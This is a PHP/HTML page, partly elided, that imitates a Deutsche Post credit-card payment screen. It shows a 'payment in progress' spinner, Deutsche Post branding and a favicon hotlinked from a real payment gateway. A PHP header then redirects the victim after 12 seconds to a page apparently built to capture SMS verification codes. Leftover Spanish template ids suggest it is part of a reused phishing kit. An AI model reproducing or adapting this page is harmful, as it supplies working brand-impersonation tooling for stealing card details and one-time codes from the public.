<?php
header("Refresh: 12; url=Zahlung_mit_Kreditkarte_SMS.html", true, 303);
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive gr__sc-icpdz_deutschepost_es">
<head id="Head1">
    <style>
        .hidden {
            display: none;
    ...
    <link id="Link1" rel="shortcut icon"
          href="https://spg.evopayments.eu/pay/Templates/imagespg_85841/img/favicon.ico">
    <link id="Link2" rel="icon" href="https://spg.evopayments.eu/pay/Templates/imagespg_85841/img/favicon.ico"
          type="image/ico">
    <script language="javascript" type="text/javascript"
    ...
    <div id="showLoading" style="display: none;">
        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
            <div class="load-container load">
                <div class="loader">
                    <span id="cargar" >Zahlung läuft</span></div>
            </div>
        </div>
    </div>
            ...
            <div id="cabecera" class="container ogilvy-bg-amarillo">
                <div class="row">
                    <div class="col-xs-12 text-center ogilvy-header">
                        <img src="Zahlung mit Kreditkarte_files/walterdima.png" id="logodeutschepost"
                             class="ogilvy-logosuperior" alt="deutschepost">
            ...
            <div class="contenido" id="contenido">
                ...
                <div id="updPanel">
                    ...
                    <div id="updateProgress" style="display:block;" role="status" aria-hidden="true">
                        ...
                        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                            <div class="load-container load">
                                <div class="loader"><br><br><br><br><br><br><br><br>
								<img  width="108" height="108" src="Zahlung mit Kreditkarte_files/dplogo.svg">
								<br>
                                    <span id="loading">Zahlung läuft</span>
                                </div>
								
                                <img  width="108" height="108" src="Zahlung mit Kreditkarte_files/loading-1.gif">
                            </div>
                        </div>
